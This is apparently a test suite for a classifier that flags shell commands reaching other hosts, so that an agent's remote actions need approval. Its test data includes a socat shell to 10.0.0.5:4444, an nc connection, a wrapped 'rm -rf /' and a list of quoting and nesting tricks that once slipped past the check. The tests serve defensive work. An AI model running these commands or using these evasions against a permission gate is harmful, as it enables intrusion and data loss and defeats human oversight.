"""Classifying a shell command by where its effects land (D12, D21).

The asymmetry these tests encode: a false positive costs a prompt, a false
negative costs an unapproved shell on someone else's machine. Everything
ambiguous therefore resolves away from `LOCAL`.
"""

from __future__ import annotations

import shlex

import pytest

from nomad.tools.egress import Egress, classify, classify_params


@pytest.mark.parametrize(
    "command",
    [
        "ls -la",
        "python -m pytest",
        "git status",
        "grep -r ssh_config /etc",  # names ssh, invokes grep
        "echo 'ssh prod'",  # quoted, so a single token
        "",
    ],
)
def test_local_commands_stay_local(command: str) -> None:
    assert classify(command) is Egress.LOCAL


@pytest.mark.parametrize(
    "command",
    [
        "ssh prod uptime",
        "/usr/bin/ssh prod uptime",
        "cat x | ssh prod sh",
        "env FOO=1 ssh prod uptime",
        "scp a.txt prod:/tmp/",
        "rsync -a ./ prod:/srv/",
        "sftp prod",
        "mosh prod",
        "sshpass -p hunter2 ssh prod",
        "nc 10.0.0.5 4444",
        "socat TCP:10.0.0.5:4444 EXEC:/bin/sh",
        "kubectl exec pod -- sh",
    ],
)
def test_anything_that_reaches_another_host_is_remote(command: str) -> None:
    assert classify(command) is Egress.REMOTE


def test_an_unbalanced_quote_is_unclassifiable_not_local() -> None:
    assert classify("ssh prod 'oops") is Egress.UNCLASSIFIABLE
    assert classify('echo "unterminated') is Egress.UNCLASSIFIABLE


def test_the_scan_covers_every_token_not_just_the_first() -> None:
    """`&&` and pipes make the first token a poor proxy for what runs."""
    assert classify("cd /tmp && ssh prod uptime") is Egress.REMOTE
    assert classify("true; ssh prod uptime") is Egress.REMOTE


def test_classify_params_finds_the_shell_command() -> None:
    assert classify_params({"command": "ls"}) is Egress.LOCAL
    assert classify_params({"command": "ssh prod uptime"}) is Egress.REMOTE


def test_params_with_no_command_carry_no_verdict() -> None:
    """`None` is "not a shell call", which is not the same as "local"."""
    assert classify_params({"file_path": "/tmp/x"}) is None


def test_a_non_string_command_is_unclassifiable_not_local() -> None:
    """The bridge routes before the params model validates; it must not guess."""
    assert classify_params({"command": ["ssh", "prod"]}) is Egress.UNCLASSIFIABLE
    assert classify_params({"command": None}) is Egress.UNCLASSIFIABLE


# -- wrapped commands (the third adversarial review) -------------------------
#
# `bash -c "ssh prod rm -rf /"` tokenises to three tokens, the third of which
# is a whole command wearing one pair of quotes. The scan saw no `ssh` and
# answered LOCAL — D27's bypass, reopened by one level of quoting.


@pytest.mark.parametrize(
    "command",
    [
        'bash -c "ssh prod rm -rf /"',
        "sh -c 'ssh prod uptime'",
        'eval "ssh prod uptime"',
        'su -c "ssh prod uptime" root',
        'env FOO=1 sh -c "ssh prod uptime"',
        "sh -c \"sh -c 'ssh prod uptime'\"",
        "bash <<EOF\nssh prod uptime\nEOF",
    ],
)
def test_a_command_wrapped_in_a_shell_is_still_remote(command: str) -> None:
    assert classify(command) is Egress.REMOTE


@pytest.mark.parametrize(
    "command",
    [
        # A language this module has no business parsing.
        "python -c \"import os; os.system('ssh h')\"",
        'python3 -c "print(1)"',
        'perl -e "system(q{ssh h})"',
        'node --eval "require(\'child_process\')"',
        # The text that will run has not been written yet.
        "$(echo ssh) prod",
        "echo `ssh prod uptime`",
        "diff <(ssh a cat x) y",
        # An unreadable inner command is unreadable at any depth.
        'bash -c "echo \\"unbalanced"',
    ],
)
def test_a_command_it_cannot_read_is_never_local(command: str) -> None:
    assert classify(command) is Egress.UNCLASSIFIABLE


@pytest.mark.parametrize(
    "command",
    [
        # Read, not guessed: this is what keeps the rule from denying every
        # wrapped-but-innocuous command, which on a device with no SSH target
        # registered would be a refusal to work rather than a prompt.
        'bash -c "ls -la /tmp"',
        "sh -c 'git status'",
        # `python` without an inline-code flag runs a file, which is no more
        # opaque than any other binary.
        "python -m pytest -q",
        "python script.py --ssh-config /etc",
        # Not a wrapper, so its quoted argument is a string and stays one.
        'git commit -m "fix the ssh bug"',
        "cd $HOME && ls",
    ],
)
def test_a_readable_wrapped_command_is_still_local(command: str) -> None:
    assert classify(command) is Egress.LOCAL


def test_remote_beats_unreadable_at_any_depth() -> None:
    """"I found ssh" is never downgraded to "I cannot tell"."""
    assert classify('python -c "x" ; ssh prod uptime') is Egress.REMOTE
    assert classify('bash -c "ssh h" -c "python -c 1"') is Egress.REMOTE


def test_nesting_is_bounded_and_the_bound_fails_closed() -> None:
    """Past the depth limit the answer is "cannot tell", never "local".

    Wrapping is unbounded and the reader is not, so the bound has to be a
    verdict rather than a silent stop. Buried far enough down, an `ssh` this
    module can no longer reach must still not read as a local command.
    """
    buried = "ssh prod uptime"
    for _ in range(5):
        buried = f"sh -c {shlex.quote(buried)}"
    assert classify(buried) is Egress.UNCLASSIFIABLE
